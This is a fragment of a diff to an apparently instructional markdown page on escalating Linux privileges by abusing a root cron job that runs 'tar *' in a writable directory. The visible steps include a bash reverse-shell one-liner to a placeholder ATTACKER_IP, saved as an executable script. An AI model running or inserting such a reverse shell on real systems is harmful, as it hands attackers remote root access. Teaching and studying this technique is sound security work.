@@ -10,6 +10,7 @@ When a root cron job runs `tar *` in a writable directory, filenames beginning w
 
 ## Steps
 
+<!-- cmd: linux -->
 ```bash
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
 chmod +x shell.sh
